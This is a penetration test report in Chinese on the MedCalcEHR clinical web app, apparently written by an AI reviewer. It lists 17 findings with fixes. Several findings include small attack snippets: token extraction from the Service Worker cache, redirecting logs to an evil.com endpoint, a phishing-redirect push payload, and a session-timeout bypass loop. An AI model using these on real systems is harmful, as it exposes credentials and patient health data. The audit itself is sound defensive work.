# MedCalcEHR 滲透測試報告

**測試日期：** 2026-03-09
**測試方法：** 白箱靜態程式碼審查（White-box Static Code Review）
**測試範圍：** 完整原始碼庫（TypeScript、JavaScript、Nginx、Docker 設定）
**測試人員：** Claude Opus 4.6 AI 安全審查

---

## 摘要

本次滲透測試針對 MedCalcEHR 醫療計算器應用程式進行全面安全評估，涵蓋五大攻擊面：

| 攻擊面 | 檢查項目 |
|--------|---------|
| 身分驗證與工作階段管理 | OAuth/SMART-on-FHIR 啟動流程、Token 生命週期、工作階段逾時 |
| 跨站腳本與注入攻擊 | innerHTML 使用、DOM XSS、HTML/JS 注入 |
| 敏感資料暴露與加密 | PHI 處理、AES-GCM 實作、localStorage 安全 |
| FHIR API 與網路安全 | 查詢參數注入、寫入驗證、Nginx 設定 |
| 客戶端邏輯與 Service Worker | 快取污染、動態載入、推播通知 |

### 發現統計

| 嚴重程度 | 數量 |
|---------|------|
| 高 (High) | 2 |
| 中 (Medium) | 13 |
| 低 (Low) | 2 |
| **合計** | **17** |

### 整體評估

MedCalcEHR 展現出成熟的安全架構：AES-GCM 加密、UIBuilder 預設 HTML 跳脫、PHI 自動過濾、CSP 標頭、Calculator ID 白名單驗證。大多數發現屬於縱深防禦缺口（defense-in-depth gap），而非直接可利用的遠端攻擊。最需優先修復的是 **FHIR 寫入服務的病患驗證繞過** 及 **Service Worker 快取含有 Authorization 標頭** 兩項高風險發現。

---

## 高風險發現 (High)

### PT-01：FHIR 寫入服務在缺少病患上下文時跳過驗證

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | High |
| **信心度** | 7/10 |
| **檔案** | `src/fhir-write-service.ts:85` |
| **分類** | 授權繞過 (Authorization Bypass) |

**描述：** FHIR 寫入服務的病患 ID 比對檢查使用可選鏈結（optional chaining）：

```typescript
if (this.client?.patient?.id && request.patientId !== this.client.patient.id)
```

當 `this.client.patient.id` 為 `undefined`（例如 user-level launch 而非 patient-level launch）時，整個條件為 falsy，驗證被完全跳過。寫入操作將使用請求中提供的任意 `patientId`。

**攻擊場景：** 在缺少病患上下文的 SMART 啟動模式下，攻擊者可在 `WriteBackRequest` 中指定任意 `patientId`，將計算結果寫入非授權病患的 FHIR 記錄。

**修復建議：** 當 `client.patient.id` 不可用時，應拒絕寫入操作而非跳過檢查：

```typescript
if (!this.client?.patient?.id) {
    throw new Error('Patient context required for write operations');
}
if (request.patientId !== this.client.patient.id) {
    throw new Error('Patient ID mismatch');
}
```

---

### PT-02：Service Worker 快取含有 Authorization 標頭的 FHIR 請求

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | High |
| **信心度** | 8/10 |
| **檔案** | `service-worker.js:110-112, 166` |
| **分類** | 憑證暴露 (Credential Exposure) |

**描述：** Service Worker 的 `networkFirst` 策略對 FHIR 請求執行 `cache.put(request, response.clone())`，此操作同時快取完整的 Request 物件（包含 `Authorization: Bearer <token>` 標頭）及含有 PHI 的回應內容。

**攻擊場景：** 攻擊者透過物理存取、XSS、或瀏覽器擴充功能存取 Cache API：

```javascript
const cache = await caches.open('medcalc-fhir-v1.0.1');
const keys = await cache.keys();
// 每個 key (Request) 都包含 Authorization 標頭
keys.forEach(req => console.log(req.headers.get('Authorization')));
```

雖然登出時呼叫 `clearFHIRCache()`，但此操作為盡力而為（best-effort），失敗時靜默忽略。

**修復建議：**
1. 快取前移除 Authorization 標頭：對 Request 建立無驗證標頭的副本後再快取
2. 或完全停止快取 FHIR 請求（應用層 `FHIRCacheManager` 已提供加密快取）

---

## 中風險發現 (Medium)

### PT-03：部署設定預設使用 `offline_access` scope

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | Medium |
| **信心度** | 9/10 |
| **檔案** | `docker-entrypoint.sh:115`、`public/js/app-config.js:7`、`docker-compose.yml:36` |
| **分類** | OAuth 設定錯誤 |

**描述：** `fhir-launch.ts` 原始碼已正確預設為 `online_access`，但 Docker 啟動腳本、docker-compose.yml 及已提交的 `app-config.js` 仍使用 `offline_access`。由於 `app-config.js` 在應用程式啟動時透過 `window.MEDCALC_CONFIG` 注入設定，執行時期的 scope 為 `offline_access`。

**風險：** 公開客戶端 SPA 持有 refresh token 違反 OAuth 2.0 for Browser-Based Apps 最佳實踐。若 token 被竊取，攻擊者可無限期取得新的 access token。

**修復建議：** 將 `docker-entrypoint.sh` 第 115 行和 `docker-compose.yml` 第 36 行的預設 scope 改為 `online_access`。

---

### PT-04：Nginx 靜態資源回應遺失全部安全標頭

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | Medium |
| **信心度** | 9/10 |
| **檔案** | `nginx.conf:99-117` |
| **分類** | 安全標頭缺失 |

**描述：** Nginx 的 `add_header` 指令在子 `location` 區塊中會完全覆蓋父層級的 `add_header`，而非疊加。靜態圖片（第 99-103 行）、`/assets/`（第 106-110 行）及 JS/CSS 檔案（第 113-117 行）的 location 區塊僅設定 `Cache-Control`，導致所有安全標頭（CSP、X-Frame-Options、X-Content-Type-Options、HSTS、COOP、CORP、Referrer-Policy）在這些回應中全部遺失。

**風險：** JS 檔案缺少 `X-Content-Type-Options: nosniff` 可能導致 MIME 類型嗅探攻擊。缺少 HSTS 可能導致資源請求被降級攻擊。

**修復建議：** 在每個子 location 區塊中重新加入所有安全標頭，或使用 `headers-more` 模組的 `more_set_headers` 替代 `add_header`。

---

### PT-05：`Object.freeze(window.MEDCALC_CONFIG)` 為淺層凍結

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | Medium |
| **信心度** | 9/10 |
| **檔案** | `src/main.ts:46-48` |
| **分類** | 設定竄改 |

**描述：** `Object.freeze()` 僅凍結頂層屬性，巢狀物件（`fhir`、`session`、`sentry`、`ehr`、`logging`）仍可被修改。此外，`calculator-page.ts` 完全未執行凍結。

**攻擊場景：**

```javascript
// freeze 後仍可成功修改：
window.MEDCALC_CONFIG.session.timeoutMinutes = 999999;  // 停用工作階段逾時
window.MEDCALC_CONFIG.session.disableTokenLifecycle = true;  // 停用 token 監控
window.MEDCALC_CONFIG.logging.remoteEndpoint = 'https://evil.com/collect';  // 竊取日誌
```

**修復建議：** 使用深層凍結（deep freeze）函數遞迴凍結所有巢狀物件，並確保 `calculator-page.ts` 也執行凍結。

---

### PT-06：稽核事件 localStorage 鍵在登出後殘留含 PHI 資料

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | Medium |
| **信心度** | 9/10 |
| **檔案** | `src/session-manager.ts:133`、`src/audit-event-service.ts:378-379` |
| **分類** | 資料殘留 (Data Remnants) |

**描述：** 登出流程清除的 localStorage 前綴為 `medcalc-phi-`、`medcalc-history-`、`medcalc-provenance-`（使用連字號），但稽核事件服務使用的鍵為 `medcalc_audit_pending` 和 `medcalc_audit_sequence`（使用底線），不符合任何清除前綴，因此登出後殘留。

**敏感資料：** 稽核事件包含病患 ID、病患姓名、醫師姓名、FHIR 資源參照、計算器輸入/結果。

**修復建議：** 在登出流程中加入 `medcalc_audit` 前綴的清除邏輯，或統一鍵名命名規則。

---

### PT-07：舊版 XOR 混淆仍在使用中且可被輕易反轉

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | Medium |
| **信心度** | 9/10 |
| **檔案** | `src/security.ts:421-485, 582-615` |
| **分類** | 弱加密 (Weak Cryptography) |

**描述：** 已棄用的 XOR 加密使用靜態可預測金鑰 `'MedCalcEHR_PHI_Protection_v1' + window.location.hostname`。`decodeStoredData` 函數（第 582 行）仍主動支援解碼 `enc:` 前綴的資料。金鑰完全可重建（靜態字串 + 公開的主機名稱），任何存取 localStorage 的人皆可解密。

**修復建議：**
1. 加入啟動時主動遷移邏輯，將所有 `enc:` 資料重新加密為 AES-GCM
2. 設定移除舊版 XOR 解碼的截止日期

---

### PT-08：Sentry PHI 過濾模式落後於 Logger

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | Medium |
| **信心度** | 8/10 |
| **檔案** | `src/sentry.ts:20-24` vs `src/logger.ts:24-31` |
| **分類** | 敏感資料暴露 |

**描述：** Sentry 的 `PHI_PATTERNS` 僅包含 3 個正規表達式（SSN、兩種生日格式），而 Logger 包含 6 個模式，額外涵蓋電話號碼、電子郵件、台灣身分證字號。當例外訊息包含這些資料時，會被未過濾地傳送至 Sentry 雲端。

**修復建議：** 統一 Sentry 和 Logger 的 PHI 過濾模式，讓 Sentry 也過濾電話、電子郵件和身分證字號。

---

### PT-09：`result.breakdown` 未跳脫直接插入 innerHTML

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | Medium |
| **信心度** | 8/10 |
| **檔案** | `src/calculators/shared/unified-formula-calculator.ts:973` |
| **分類** | 跨站腳本 (XSS) |

**描述：** `complexCalculate()` 回傳的 `result.breakdown` 字串直接插入 innerHTML 而無跳脫：

```typescript
html += `<div class="mt-15 text-sm text-muted">${result.breakdown}</div>`;
resultContent.innerHTML = html;
```

目前所有呼叫端僅使用硬編碼字串和數值，但此模式無防護機制，若未來任何計算器將 FHIR 來源資料（病患姓名、觀察值顯示名稱）納入 `breakdown`，將立即成為 Stored XSS 漏洞。

**修復建議：** 使用 `sanitizeHTML(result.breakdown)` 替代直接插值，保留安全格式標籤（`<strong>`、`<br>`）同時移除危險元素。

---

### PT-10：CSP `frame-ancestors` 指令不一致

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | Medium |
| **信心度** | 8/10 |
| **檔案** | `nginx.conf:28,37`、`index.html:11`、`calculator.html:10` |
| **分類** | 安全標頭衝突 / Clickjacking |

**描述：** 存在多重衝突：
- Nginx 的 CSP 包含 `frame-ancestors 'none'`（禁止嵌入），但 `X-Frame-Options` 設為 `SAMEORIGIN`（允許同源嵌入）
- `launch.html` 的 meta CSP 包含 `frame-ancestors 'none'`，但 `index.html` 和 `calculator.html` 的 meta CSP 未包含 `frame-ancestors`
- SMART on FHIR 應用通常需在 EHR iframe 中啟動，`frame-ancestors 'none'` 可能破壞此流程

**風險：** 策略不一致暗示 CSP 可能在部署時被覆蓋或忽略，削弱整體防護。

**修復建議：** 統一所有頁面的 `frame-ancestors` 策略，根據實際部署模式（獨立視窗或 EHR iframe）選擇一致的值。

---

### PT-11：重導向 URI 同源前綴匹配過於寬鬆

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | Medium |
| **信心度** | 7/10 |
| **檔案** | `src/fhir-launch.ts:48` |
| **分類** | 開放重導向 |

**描述：** 重導向 URI 驗證使用 `rawRedirectUri.startsWith(window.location.origin)` 進行前綴比對，允許同源下的任意路徑。若同源下存在任何使用者可控內容或開放重導向端點，OAuth 授權碼可能被導向該處。

**修復建議：** 僅使用嚴格白名單（`ALLOWED_REDIRECTS`），移除 `startsWith` 回退。

---

### PT-12：FHIR 快取清除可靜默失敗導致 PHI 殘留

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | Medium |
| **信心度** | 7/10 |
| **檔案** | `src/session-manager.ts:146-150`、`src/sw-register.ts:189-209` |
| **分類** | 資料殘留 |

**描述：** 登出時 `clearFHIRCache()` 依賴 Service Worker 回應 `CLEAR_FHIR_CACHE` 訊息（10 秒逾時）。若 Service Worker 未啟用、未控制頁面、或訊息通道失敗，回退的 Cache API 直接清除也在靜默 catch 中。兩個路徑都可能失敗，但登出流程不會通知使用者。

**修復建議：** 至少記錄清除失敗的情況；考慮在登出後的重導向頁面（`launch.html`）中再次嘗試清除。

---

### PT-13：Service Worker 推播通知點擊含開放重導向

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | Medium |
| **信心度** | 7/10 |
| **檔案** | `service-worker.js:355` |
| **分類** | 開放重導向 (Open Redirect) |

**描述：** `notificationclick` 事件處理直接開啟通知資料中的 URL，無任何驗證：

```javascript
event.waitUntil(clients.openWindow(event.notification.data.url || '/'));
```

**攻擊場景：** 攻擊者入侵推播通知端點，發送 `{ "url": "https://evil.com/fake-login" }`。臨床人員點擊通知後，瀏覽器開啟釣魚網站。

**修復建議：** 驗證 URL 為同源或已允許的白名單網域。

---

### PT-14：`generateHTML()` 輸出未經消毒直接插入 DOM

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | Medium |
| **信心度** | 7/10 |
| **檔案** | `src/calculator-page.ts:148` |
| **分類** | 供應鏈 XSS |

**描述：** `card.innerHTML = calculator.generateHTML()` 直接將動態載入的計算器模組輸出渲染至 DOM。安全性完全依賴計算器模組檔案的完整性。若攻擊者可修改任何計算器模組（供應鏈攻擊、建置管線入侵、Service Worker 快取污染），將在臨床應用程式上下文中執行任意 JavaScript。

**修復建議：** 考慮對 `generateHTML()` 輸出執行 `sanitizeHTML()` 作為縱深防禦。

---

### PT-15：CSP 允許寬泛萬用字元子網域

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | Medium |
| **信心度** | 7/10 |
| **檔案** | `nginx.conf:37` |
| **分類** | CSP 弱化 |

**描述：** CSP 包含 `https://*.smarthealthit.org` 和 `https://*.cerner.com` 萬用字元。若攻擊者透過子網域接管（subdomain takeover）控制任何子網域，即可繞過 CSP 進行資料竊取。

**修復建議：** 盡可能使用完整網域名稱替代萬用字元。

---

## 低風險發現 (Low)

### PT-16：合成 DOM 事件可繞過工作階段逾時

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | Low |
| **信心度** | 8/10 |
| **檔案** | `src/session-manager.ts:27, 51-58` |
| **分類** | 工作階段管理弱點 |

**描述：** 工作階段管理器在 `mousemove`、`keydown` 等事件上重置計時器，30 秒節流。瀏覽器擴充功能或 DevTools 腳本可透過每 31 秒發送一次合成事件無限期保持工作階段存活：

```javascript
setInterval(() => document.dispatchEvent(new MouseEvent('mousemove')), 31000);
```

**風險：** 對於需遵循 HIPAA 的 PHI 存取應用程式，工作階段逾時是必要的安全控制。

---

### PT-17：版本控制中的預設 FHIR Client ID

| 項目 | 內容 |
|-----|------|
| **嚴重程度** | Low |
| **信心度** | 8/10 |
| **檔案** | `public/js/app-config.js:5`、`docker-entrypoint.sh:114` |
| **分類** | 資訊洩漏 |

**描述：** FHIR Client ID `e1b41914-e2b5-4475-90ba-29022b57f820` 作為預設值硬編碼在原始碼中。雖然 OAuth 公開客戶端 ID 本身非機密，但已知的 Client ID 可被用來在 EHR OAuth 伺服器上模擬此應用程式。

**修復建議：** 移除預設值，強制部署時透過環境變數提供。

---

## 正面發現（安全控制亮點）

以下為測試過程中確認的正向安全措施：

| 控制項 | 說明 |
|-------|------|
| **Calculator ID 白名單** | `loadCalculator()` 使用正規表達式 `/^[a-z0-9-]+$/` + `calculatorModules` 白名單雙重驗證，有效阻擋路徑穿越攻擊 |
| **UIBuilder 預設跳脫** | 16+ 個模板方法預設呼叫 `escapeHtml()`，`createAlert` 預設 `escapeMessage: true` |
| **AES-GCM 實作正確** | 每次加密使用 96-bit 隨機 IV、non-extractable 金鑰、正確的 IV+密文串接 |
| **PHI 自動過濾** | Logger 和 Sentry 自動過濾 SSN、生日、電話、電子郵件等 PHI 模式 |
| **嚴格 CSP** | `script-src 'self'`（無 `unsafe-inline`、`unsafe-eval`） |
| **i18n 原型污染防護** | `resolve()` 明確阻擋 `__proto__`、`constructor`、`prototype` 鍵 |
| **URL 參數安全處理** | `calculator-page.ts` 對未知 Calculator ID 使用 `textContent` 而非 `innerHTML` |
| **無 eval/Function** | 生產程式碼中未使用 `eval()`、`Function()`、字串型 `setTimeout`/`setInterval` |
| **無 postMessage 監聽** | 主應用程式未註冊 `message` 事件監聽器，消除該攻擊面 |
| **FHIR 寫入驗證** | 字串欄位長度限制、`calculatorId` 英數字驗證、通用錯誤回應 |

---

## 修復優先順序建議

### 第一優先（立即修復）

| 編號 | 發現 | 原因 |
|-----|------|------|
| PT-01 | FHIR 寫入病患驗證繞過 | 可能導致跨病患資料寫入，直接影響病患安全 |
| PT-02 | SW 快取含 Authorization 標頭 | Token 暴露風險，可被用於未授權存取 |
| PT-03 | 部署預設 `offline_access` | 違反 OAuth 最佳實踐，refresh token 暴露風險 |

### 第二優先（短期修復）

| 編號 | 發現 | 原因 |
|-----|------|------|
| PT-04 | Nginx 安全標頭遺失 | 多種資源類型缺少全部安全標頭 |
| PT-05 | 淺層 Object.freeze | 安全設定可被執行時期竄改 |
| PT-06 | 稽核事件殘留 | 登出後 PHI 資料未清除 |
| PT-08 | Sentry PHI 模式不足 | 電話/電子郵件/身分證可能洩漏至第三方 |

### 第三優先（中期修復）

| 編號 | 發現 | 原因 |
|-----|------|------|
| PT-07 | 舊版 XOR 仍可使用 | 已棄用但仍有向後相容路徑 |
| PT-09 | breakdown 未跳脫 | 目前安全但缺乏防護機制 |
| PT-10 | frame-ancestors 不一致 | 安全策略矛盾 |
| PT-11 | 重導向 URI 寬鬆匹配 | 同源前綴而非嚴格白名單 |
| PT-12 | FHIR 快取清除靜默失敗 | PHI 可能殘留 |
| PT-13 | 推播通知開放重導向 | 未驗證 URL 目標 |
| PT-14 | generateHTML 無消毒 | 供應鏈風險的縱深防禦缺口 |
| PT-15 | CSP 萬用字元子網域 | 子網域接管風險 |

---

## 測試方法論

本次測試採用以下方法：

1. **儲存庫上下文研究** — 識別現有安全框架、函式庫及安全編碼模式
2. **攻擊面分解** — 將應用程式分為 5 個攻擊面，由專門的測試代理平行掃描
3. **資料流追蹤** — 從使用者輸入和 FHIR 資料來源追蹤至敏感操作（DOM 渲染、儲存、API 呼叫）
4. **誤報過濾** — 每項發現經獨立驗證，僅保留信心度 ≥ 6 的結果
5. **比較分析** — 新程式碼與現有安全模式進行比對，識別不一致處

### 工具與技術

- 靜態程式碼分析（全原始碼檢閱）
- 正規表達式搜索（innerHTML、eval、localStorage、console.log 等危險模式）
- 設定檔審查（Nginx、Docker、CSP、OAuth）
- 資料流分析（FHIR → DOM、FHIR → Storage、User Input → API）

---

*報告完畢。如需針對任何發現進行更深入的分析或概念驗證，請聯繫安全團隊。*
